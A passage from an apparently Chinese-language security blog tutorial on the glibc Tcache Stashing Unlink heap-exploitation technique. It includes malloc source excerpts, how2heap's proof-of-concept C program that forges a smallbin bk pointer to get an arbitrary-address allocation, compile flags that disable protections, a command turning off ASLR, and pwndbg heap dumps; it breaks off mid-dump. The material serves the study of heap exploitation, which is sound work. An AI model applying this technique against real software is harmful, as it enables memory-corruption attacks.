class="meta">#victim是smallbin的最后一个堆块</span></span><br></pre></td></tr></table></figure><p>对比一下就知道，Tcache Stashing Unlink Attack 存在的原因是在放入 tcache 的过程中只是对第一个 bin 进行了检查，对后续的 chunk 检查缺失，因此当 smallbin 的 bk 指针被修改时，构造得当的情况下可以分配到任意地址。<br>注意刚才描述的放入过程是一个循环，我们将伪造的 bck 看成一个堆块，其 bk 很可能是一个非法的地址，这样就导致循环到下一个堆块时 unlink 执行到 bck-&gt;fd = bin;访问非法内存造成程序 crash。为了避免这种情况我们选择释放 6 个对应 size 的 chunk 到 tcache bin，只为 tcache 留一个空间，这样循环一次就会跳出，不会有后续问题。<br>并且 tcache_put 函数没有做任何的安全检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#malloc.c 第2927-2940行</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h1><p>来看一下攻击条件：</p><ul><li>开启 tcache 机制</li><li>tcachebin 未满（<strong>有一个位置未填充 free chunk</strong>）</li><li>smallbin 中要至少有两个大小相同的 free chunk</li></ul><p>但是仔细想想这个攻击方式可能有些矛盾：<br>首先，tcache 的机制加入后，free 的 chunk 是优先加入 tcachebin 中的，同时 malloc 的时候也优先向 tcache 中取出 free chunk，也就是说 tcache 机制拥有绝对优先权。<br>放到 smallbin 来说，我们不能越过 tcache 向 smallbin 中填入 chunk，也不能越过 tcache 从 smallbin 中取出 chunk（除非 tcache 中 bin 的总数加起来大于 TCACHE_MAX_BINS（已满））。<br>进一步说要使用 Tcache Stashing Unlink Attack 对 smallbin 发起攻击，条件之一是 smallbin 中要至少有两个大小相同的 free chunk，但是要将 free chunk 放入 smallbin 的条件必须是对应 size 大小的 tcachebin 链已满，但是这种攻击方式要求对应的 tcachebin 链不能满，否则无法将 free chunk 加入到 tcache 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">     <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//判断对应size tcache链表是否已满</span></span><br><span class="line">               <span class="comment">//取出smallbin的末尾chunk</span></span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin) <span class="comment">//判断取出的chunk是否为bin本身（smallbin是否已空）</span></span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p>这就看起来很矛盾了，会导致这个漏洞无法成功的被利用。<br>但是 calloc 函数有一个很特殊的性质，在使用 calloc 分配堆块时不会从 tcachebin 中获取 chunk，也就是说 calloc 可以直接分配 smallbin 中的 chunk 无论 tcachebin 满不满，这就可以越过“不能越过 tcache 从 smallbin 中取出 chunk”这个矛盾。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>接下来我们使用 how2heap 中的 tcache_stashing_unlink_attack.c 示例进行说明：</p><blockquote><p>源代码由@yichen 师傅进行翻译：<a href="https://www.yuque.com/hxfqg9/bin/qlry85#keGjh">https://www.yuque.com/hxfqg9/bin/qlry85#keGjh</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var 是我们希望分配到的地址，我们首先把 &amp;stack_var[2] 写到 stack_var[3] 来绕过 glibc 的 bck-&gt;fd=bin（即 fake chunk-&gt;bk 应该是一个可写的地址）\n&quot;</span>);</span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;修改之后 fake_chunk-&gt;bk 是:%p\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var[4] 的初始值是:%p\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在申请 9 个 0x90 的 chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;先释放 6 个，这 6 个都会放到 tcache 里面\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;接下来的释放的三个里面第一个是最后一个放到 tcache 里面的，后面的都会放到 unsortedbin 中\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//接下来的就是放到 unsortedbin 了</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;接下来申请一个大于 0x90 的 chunk，chunk0 和 chunk2 都会被整理到 smallbin 中\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">//&gt;0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;然后再去从 tcache 中申请两个 0x90 大小的 chunk\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;假设有个漏洞，可以把 victim-&gt;bk 的指针改写成 fake_chunk 的地址: %p\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 calloc 申请一个 0x90 大小的 chunk，他会把一个 smallbin 里的 chunk0 返回给我们，另一个 smallbin 的 chunk2 将会与 tcache 相连.\n&quot;</span>);</span><br><span class="line">    pp = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这时候我们的 fake_chunk 已经放到了 tcache bin[0xa0] 这个链表中，它的 fd 指针现在指向下一个空闲的块: %p， bck-&gt;fd 已经变成了 libc 的地址: %p\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;再次 malloc 0x90 可以看到申请到了 fake_chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;finish!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>编译命令：<br>gcc -g -fno-stack-protector -z execstack -no-pie -z norelro tcache_stashing_unlink_attack.c -o tcache_stashing_unlink_attack</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#关闭ALSR地址随机化进行调试</span></span><br><span class="line">ubuntu@ubuntu:~/Desktop/tcache_stashing_unlink_attack<span class="variable">$</span> sudo su</span><br><span class="line">[<span class="type">sudo</span>] password <span class="keyword">for</span> ubuntu:</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop/tcache_stashing_unlink_attack<span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop/tcache_stashing_unlink_attack<span class="comment"># exit</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">ubuntu@ubuntu:~/Desktop/tcache_stashing_unlink_attack<span class="variable">$</span></span><br></pre></td></tr></table></figure><p>这个 poc 定义了一个 stack_var 数组来模拟 fake chunk，首先申请了 9 个大小相同的 chunk（b 19）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info local</span><br><span class="line">chunk_lis = &#123;<span class="number">0</span>x602260, <span class="number">0</span>x602300, <span class="number">0</span>x6023a0, <span class="number">0</span>x602440, <span class="number">0</span>x6024e0, <span class="number">0</span>x602580, <span class="number">0</span>x602620, <span class="number">0</span>x6026c0, <span class="number">0</span>x602760, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0, <span class="number">0</span>x0&#125;</span><br></pre></td></tr></table></figure><p>然后释放 6 个 chunk，chunk 会进入 tcache 中（b 24）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0</span>x602000</span><br><span class="line"><span class="number">0</span>x602000:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000251 <span class="comment">#tcache_perthread_struct</span></span><br><span class="line"><span class="number">0</span>x602010:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000006</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602090:<span class="number">0</span>x0000000000602760<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="comment">#指向最后一个tcache free chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602250:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk1（malloc）</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6022f0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk2（malloc）</span></span><br><span class="line"><span class="number">0</span>x602300:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602390:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk3（malloc）</span></span><br><span class="line"><span class="number">0</span>x6023a0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602430:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk4(free)</span></span><br><span class="line"><span class="number">0</span>x602440:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000602010</span><br><span class="line"><span class="comment">#tcache_key</span></span><br><span class="line">                              <span class="comment">#防止tcache double free（可以绕过）</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6024d0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk5(free)</span></span><br><span class="line"><span class="number">0</span>x6024e0:<span class="number">0</span>x0000000000602440<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602570:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk6(free)</span></span><br><span class="line"><span class="number">0</span>x602580:<span class="number">0</span>x00000000006024e0<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602610:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk7(free)</span></span><br><span class="line"><span class="number">0</span>x602620:<span class="number">0</span>x0000000000602580<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6026b0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk8(free)</span></span><br><span class="line"><span class="number">0</span>x6026c0:<span class="number">0</span>x0000000000602620<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602750:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk9(free)</span></span><br><span class="line"><span class="number">0</span>x602760:<span class="number">0</span>x00000000006026c0<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6027f0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000020811 <span class="comment">#top_chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602950:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0</span>xa0 [  <span class="number">6</span>]: <span class="number">0</span>x602760 —▸ <span class="number">0</span>x6026c0 —▸ <span class="number">0</span>x602620 —▸ <span class="number">0</span>x602580 —▸ <span class="number">0</span>x6024e0 —▸ <span class="number">0</span>x602440 ◂— <span class="number">0</span>x0</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0</span>x20: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x30: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x40: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x50: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x60: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x80: <span class="number">0</span>x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0</span>x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>再次 free 三个 chunk，第一个进入 tcache 中，其余进入 unsortedbin 中（b 30）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0</span>xa0 [  <span class="number">7</span>]: <span class="number">0</span>x602300 —▸ <span class="number">0</span>x602760 —▸ <span class="number">0</span>x6026c0 —▸ <span class="number">0</span>x602620 —▸ <span class="number">0</span>x602580 —▸ <span class="number">0</span>x6024e0 —▸ <span class="number">0</span>x602440 ◂— <span class="number">0</span>x0</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0</span>x20: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x30: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x40: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x50: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x60: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x80: <span class="number">0</span>x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0</span>x602390 —▸ <span class="number">0</span>x602250 —▸ <span class="number">0</span>x7ffff7dcdca0 (main_arena+<span class="number">96</span>) ◂— nop     /* <span class="number">0</span>x602390 */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0</span>x602000</span><br><span class="line"><span class="number">0</span>x602000:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000251 <span class="comment">#tcache_perthread_struct</span></span><br><span class="line"><span class="number">0</span>x602010:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000007</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602090:<span class="number">0</span>x0000000000602300<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="comment">#指向最后一个tcache free chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602250:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk1（free-unsortedbin）</span></span><br><span class="line"><span class="number">0</span>x602260:<span class="number">0</span>x00007ffff7dcdca0<span class="number">0</span>x0000000000602390</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6022f0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk2（free-tcachebin）</span></span><br><span class="line"><span class="number">0</span>x602300:<span class="number">0</span>x0000000000602760<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602390:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk3（free-unsortedbin）</span></span><br><span class="line"><span class="number">0</span>x6023a0:<span class="number">0</span>x0000000000602250<span class="number">0</span>x00007ffff7dcdca0</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602430:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk4(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602440:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000602010</span><br><span class="line"><span class="comment">#tcache_key</span></span><br><span class="line">                              <span class="comment">#防止tcache double free（可以绕过）</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6024d0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk5(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x6024e0:<span class="number">0</span>x0000000000602440<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602570:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk6(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602580:<span class="number">0</span>x00000000006024e0<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602610:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk7(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602620:<span class="number">0</span>x0000000000602580<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6026b0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk8(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x6026c0:<span class="number">0</span>x0000000000602620<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602750:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk9(free-tcachebin)</span></span><br><span class="line"><span class="number">0</span>x602760:<span class="number">0</span>x00000000006026c0<span class="number">0</span>x0000000000602010</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6027f0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000020811 <span class="comment">#top_chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602950:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后申请比较大的 chunk，这时会调用 malloc_consolidate 对 unsortedbin 中 free chunk 进行整理（b 33）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0</span>xa0 [  <span class="number">7</span>]: <span class="number">0</span>x602300 —▸ <span class="number">0</span>x602760 —▸ <span class="number">0</span>x6026c0 —▸ <span class="number">0</span>x602620 —▸ <span class="number">0</span>x602580 —▸ <span class="number">0</span>x6024e0 —▸ <span class="number">0</span>x602440 ◂— <span class="number">0</span>x0</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0</span>x20: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x30: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x40: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x50: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x60: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x0</span><br><span class="line"><span class="number">0</span>x80: <span class="number">0</span>x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0</span>x0</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0</span>xa0: <span class="number">0</span>x602390 —▸ <span class="number">0</span>x602250 —▸ <span class="number">0</span>x7ffff7dcdd30 (main_arena+<span class="number">240</span>) ◂— nop     /* <span class="number">0</span>x602390 */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0</span>x602000</span><br><span class="line"><span class="number">0</span>x602000:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000251 <span class="comment">#tcache_perthread_struct</span></span><br><span class="line"><span class="number">0</span>x602010:<span class="number">0</span>x0000000000000000<span class="number">0</span>x0000000000000007</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602090:<span class="number">0</span>x0000000000602300<span class="number">0</span>x0000000000000000</span><br><span class="line"><span class="comment">#指向最后一个tcache free chunk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x602250:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 <span class="comment">#chunk1（free-smallbin）</span></span><br><span class="line"><span class="number">0</span>x602260:<span class="number">0</span>x00007ffff7dcdd30<span class="number">0</span>x0000000000602390</span><br><span class="line">......</span><br><span class="line"><span class="number">0</span>x6022f0:<span class="number">0</span>x0000000000000000<span class="number">0</span>x00000000000000a1 